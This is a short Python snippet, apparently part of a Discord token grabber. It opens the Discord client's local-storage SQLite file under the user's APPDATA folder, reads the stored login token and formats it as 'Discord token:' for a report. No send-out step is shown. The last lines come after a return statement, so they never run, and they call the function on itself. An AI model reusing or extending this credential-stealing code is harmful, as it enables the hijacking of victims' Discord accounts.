import os
import sqlite3


def discord_token():
   if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
       token = ''
       conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
       cursor = conn.cursor()
       for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
           token = row[1].decode("utf-16")
       conn.close()
       if token != '':
           return token
       else:
           return 'Discord exists, but not logged in'
   else:
       return 'Not found'
   ds_token = discord_token()
   ds_token += 'Discord token:' + '\n' + discord_token() + '\n' + '\n'
   return  ds_token